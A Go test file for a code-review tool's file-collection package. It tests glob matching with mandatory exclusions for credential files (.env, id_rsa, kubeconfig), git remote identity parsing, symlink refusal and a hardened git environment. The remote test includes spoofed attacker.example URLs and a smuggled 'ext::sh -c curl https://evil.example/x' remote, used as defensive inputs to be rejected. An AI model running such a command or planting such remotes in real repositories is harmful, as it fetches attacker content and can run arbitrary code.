package target

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/dsaiko/fixpoint/internal/config"
)

func TestCompileGlobs(t *testing.T) {
	cases := []struct {
		glob  string
		path  string
		match bool
	}{
		{"**/*.go", "main.go", true},
		{"**/*.go", "internal/agent/agent.go", true},
		{"**/*.go", "main.txt", false},
		{"*.go", "main.go", true},
		{"*.go", "internal/main.go", false}, // * must not cross separators
		{"**/vendor/**", "vendor/x/y.go", true},
		{"**/vendor/**", "a/vendor/y.go", true},
		{"**/vendor/**", "avendor/y.go", false},
		{"internal/**", "internal/config/config.go", true},
		{"internal/**", "cmd/main.go", false},
		// The separator in front of a "**" is a literal, so an expansion can never
		// reach past the segment that precedes it: a sibling directory whose name
		// merely starts the same keeps its files, and "foo/**/bar" is two boundaries
		// and a gap rather than a substring search.
		{"internal/**", "internalx/main.go", false},
		{"foo/**/bar", "foobar", false},
		{"foo/**/bar", "foo/x/bar", true},
		{"?.go", "a.go", true},
		{"?.go", "ab.go", false},
		// A wildcard-free glob names a directory, so it takes the contents with it --
		// either spelling, and including the "dir/" form the walk tests directories
		// with. Anchored at a segment boundary: a sibling whose name merely starts
		// the same is untouched.
		{"config/secrets", "config/secrets", true},
		{"config/secrets", "config/secrets/prod.token", true},
		{"config/secrets", "config/secrets/", true},
		{"config/secrets/", "config/secrets/prod.token", true},
		{"config/secrets/", "config/secrets", true},
		{"config/secrets", "config/secretsx/prod.token", false},
		// A wildcard ANYWHERE describes a file shape, not a directory, and must not
		// start swallowing whatever sits under a matching name -- git's wildmatch
		// does not either, and the mandatory "**/credentials" would otherwise drop
		// every source file under an ordinary credentials/ package.
		{"*.go", "main.go/notes.txt", false},
		{"**/credentials", "aws/credentials", true},
		{"**/credentials", "internal/credentials/aws.go", false},
		{"**/node_modules", "a/node_modules", true},
		{"**/node_modules", "a/node_modules/pkg/index.js", false},
		{"**/café.go", "src/café.go", true}, // multi-byte literals
		{".github/**/*.yaml", ".github/workflows/ci.yaml", true},
		// The mandatory credential patterns are spelled in lowercase and match any
		// casing: PRODUCTION.ENV and ID_RSA are the same secrets, and in the git
		// modes this exclusion is what keeps their CONTENT out of the material.
		{"**/*.env", "PRODUCTION.ENV", true},
		{"**/*.env", "svc/Docker.Env", true},
		{"**/.env.*", ".Env.Production", true},
		// direnv: ".envrc" has no dot after "env", so the dotenv patterns miss it and
		// it needs its own -- as does the cache directory of dumped exports.
		{"**/.env.*", "svc/.envrc", false},
		{"**/*.env", "svc/.envrc", false},
		{"**/.envrc", "svc/.envrc", true},
		{"**/.envrc", "deploy/.ENVRC", true},
		{"**/.envrc.*", "sub/.envrc.local", true},
		{"**/.direnv/**", ".direnv/dump/env", true},
		{"**/.direnv/**", "svc/.direnv/bin/ruby", true},
		{"**/*.pem", "certs/Server.PEM", true},
		{"**/id_rsa", "home/.ssh/ID_RSA", true},
		{"**/kubeconfig", "KubeConfig", true},
		// A CONFIGURED exclude is matched as written: folding it would silently drop
		// files nobody asked to hide from review (see config.FoldExclude).
		{"vendor/**", "Vendor/x/y.go", false},
		{"**/*.md", "README.MD", false},
	}
	for _, tc := range cases {
		res, err := compileGlobs([]string{tc.glob})
		if err != nil {
			t.Fatalf("compile %q: %v", tc.glob, err)
		}
		if got := matchAny(res, tc.path); got != tc.match {
			t.Errorf("glob %q vs %q: got %v, want %v", tc.glob, tc.path, got, tc.match)
		}
	}
}

// A SHA shorter than the abbreviation is displayed whole, never sliced: the
// pinned base comes from git's own output, but an unguarded [:12] would turn any
// short value into a panic that loses the run over a header string.
func TestShortSHA(t *testing.T) {
	cases := []struct{ sha, want string }{
		{"", ""},
		{"abc", "abc"},
		{"0123456789ab", "0123456789ab"}, // exactly the abbreviation length
		{"0123456789abcdef", "0123456789ab"},
	}
	for _, tc := range cases {
		if got := shortSHA(tc.sha); got != tc.want {
			t.Errorf("shortSHA(%q) = %q, want %q", tc.sha, got, tc.want)
		}
	}
}

// ghRemote must compare a remote's HOST/OWNER/REPO identity for equality, not
// look for the desired repository as a substring of the URL and not ignore the
// server it lives on:
//   - acme/widget is a substring of acme/widget-fork and acme/widgets, and if such
//     a remote sorts first the PR base OID would be fetched from the wrong
//     repository -- failing even though a correct remote is configured;
//   - a checkout can add attacker.example/acme/widget next to the real
//     github.com/acme/widget, and an identity that dropped the host would accept it
//     as the PR's base repository and fetch from the attacker's server.
func TestRemoteIdentity(t *testing.T) {
	cases := []struct{ url, want string }{
		{"https://github.com/acme/widget.git", "github.com/acme/widget"},
		{"https://github.com/acme/widget", "github.com/acme/widget"},
		{"https://github.com/Acme/Widget.git\n", "github.com/acme/widget"},
		{"https://token:x-oauth-basic@github.com/acme/widget.git", "github.com/acme/widget"},
		{"http://ghe.example.com/acme/widget.git", "ghe.example.com/acme/widget"},
		{"git@github.com:acme/widget.git", "github.com/acme/widget"},
		{"git@github.com:acme/widget", "github.com/acme/widget"},
		// A port that is the scheme's default names no other endpoint, so these
		// still match the canonical https URL gh reports for the same repository.
		{"ssh://git@github.com:22/acme/widget.git", "github.com/acme/widget"},
		{"https://github.com:443/acme/widget.git", "github.com/acme/widget"},
		// git's aliases for ssh:// imply the same default port.
		{"git+ssh://git@github.com:22/acme/widget.git", "github.com/acme/widget"},
		{"ssh+git://git@github.com:22/acme/widget.git", "github.com/acme/widget"},
		// The near misses a substring test would accept.
		{"https://github.com/acme/widget-fork.git", "github.com/acme/widget-fork"},
		{"https://github.com/acme/widgets.git", "github.com/acme/widgets"},
		{"git@github.com:acme/widget-fork.git", "github.com/acme/widget-fork"},
		// The near misses an owner/repo-only identity would accept: another server
		// serving the same owner/repo path, a host-shaped username in front of the
		// real host, and another endpoint on the same host.
		{"https://attacker.example/acme/widget.git", "attacker.example/acme/widget"},
		{"https://github.com@attacker.example/acme/widget.git", "attacker.example/acme/widget"},
		{"git@attacker.example:acme/widget.git", "attacker.example/acme/widget"},
		{"https://ghe.example.com:8443/acme/widget.git", "ghe.example.com:8443/acme/widget"},
		{"ssh://git@[::1]:2222/acme/widget.git", "[::1]:2222/acme/widget"},
		{"ssh://git@[::1]/acme/widget.git", "[::1]/acme/widget"},
		// Not an owner/repo remote at all: no identity to compare, so ghRemote
		// refuses (or falls back) rather than matching by accident.
		{"/srv/git/widget.git", ""},
		{"file:///srv/git/acme/widget.git", ""},
		{"https://github.com/acme", ""},
		{"https:///acme/widget.git", ""},
		{`ext::sh -c "curl https://evil.example/x"`, ""},
		{"", ""},
	}
	for _, tc := range cases {
		if got := remoteIdentity(tc.url); got != tc.want {
			t.Errorf("remoteIdentity(%q) = %q, want %q", tc.url, got, tc.want)
		}
	}
}

// The predicate the drain grace re-arms on, at the boundaries the timing-based
// gitScanNUL tests cannot pin exactly. The counter is bumped on both sides of the
// callback, so its parity carries as much meaning as its value: an odd reading is a
// callback in flight, and the increment that merely ENDS an already-in-flight
// callback is the one movement that says nothing about the pipe.
func TestScanProgressed(t *testing.T) {
	cases := []struct {
		name       string
		now, mark  uint64
		progressed bool
	}{
		// Nothing moved and no callback was running when the grace armed: the scan is
		// sitting on a pipe that delivered nothing for a whole window.
		{"idle since an even mark", 4, 4, false},
		// Nothing moved either, but the marked callback is still in it -- a single
		// Lstat or EvalSymlinks can outlast a window, and cutting would only join the
		// very call it fired over.
		{"marked callback still in flight", 3, 3, true},
		// The callback the previous firing re-armed for returned and nothing came off
		// the pipe behind it. Counted as movement this would buy a stalled scan a
		// second window before the cut.
		{"in-flight callback merely returned", 4, 3, false},
		// An entry WAS taken off the pipe: from an even mark straight into its callback,
		// or past the marked callback's return and into the next entry's.
		{"entry taken since an even mark", 5, 4, true},
		{"entry taken past the marked callback's return", 5, 3, true},
		// And a whole entry consumed, callback included, since an even mark.
		{"entry consumed since an even mark", 6, 4, true},
	}
	for _, tc := range cases {
		if got := scanProgressed(tc.now, tc.mark); got != tc.progressed {
			t.Errorf("%s: scanProgressed(%d, %d) = %v, want %v", tc.name, tc.now, tc.mark, got, tc.progressed)
		}
	}
}

// The filesystem walk is the one collection path that runs no subprocess, so
// nothing else carries the cancellation into it: a Ctrl-C during a directory-mode
// run over a large non-git tree must stop the walk rather than finish it.
func TestWalkFilesObservesContextCancellation(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "a.go"), []byte("package a\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(t.Context())
	cancel()
	c := New(config.Target{Mode: "directory", Path: dir})
	scope, err := c.fileScope()
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := c.walkFiles(ctx, scope); !errors.Is(err, context.Canceled) {
		t.Errorf("walkFiles() err = %v, want context.Canceled", err)
	}
}

// readNoFollow is the second half of the i21 fix: the document's symlink check
// and its read are one syscall, so the path cannot be swapped between them. Only
// the check had a test; the read-side refusal did not (review run
// 20260814-012440).
func TestReadNoFollowRefusesASymlink(t *testing.T) {
	dir := t.TempDir()
	regular := filepath.Join(dir, "regular.md")
	if err := os.WriteFile(regular, []byte("# real\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if b, err := readNoFollow(regular); err != nil || string(b) != "# real\n" {
		t.Fatalf("readNoFollow(regular file) = %q, %v", b, err)
	}

	link := filepath.Join(dir, "DESIGN.md")
	if err := os.Symlink(regular, link); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	b, err := readNoFollow(link)
	if err == nil {
		t.Fatalf("readNoFollow followed a symlink and returned %q", b)
	}
	if !strings.Contains(err.Error(), "symlink") {
		t.Errorf("the refusal must name the cause: %v", err)
	}
}

// UseGitEnv is the i27 fix: the write-target's collector runs git with the
// orchestrator's one hardened environment. Nothing asserted that the env it is
// given is the env its probes use (review run 20260814-012440).
func TestUseGitEnvReachesTheProbes(t *testing.T) {
	c := New(config.Target{Mode: "directory", Path: t.TempDir()})
	// Default: the process environment, hardened.
	if got := c.probeEnv(); len(got) == 0 {
		t.Fatal("probeEnv() is empty with no override")
	}

	c.UseGitEnv([]string{"PATH=/usr/bin", "GIT_CONFIG_GLOBAL=/dev/null"})
	got := c.probeEnv()
	var sawPath, sawPin, sawCount bool
	for _, e := range got {
		switch {
		case e == "PATH=/usr/bin":
			sawPath = true
		case e == "GIT_CONFIG_GLOBAL=/dev/null":
			sawPin = true
		case strings.HasPrefix(e, "GIT_CONFIG_COUNT="):
			sawCount = true
		}
		if strings.HasPrefix(e, "ANTHROPIC_API_KEY=") {
			t.Error("probeEnv leaked a credential the caller did not pass")
		}
	}
	if !sawPath || !sawPin {
		t.Errorf("probeEnv() dropped what the caller supplied: %v", got)
	}
	// Harden runs LAST, so the safeConfig pins survive the caller's env.
	if !sawCount {
		t.Error("probeEnv() did not apply the safeConfig pins over the supplied env")
	}
	if !slices.Contains(got, "LC_ALL=C") {
		t.Error("probeEnv() dropped the locale pin the parsers depend on")
	}
}
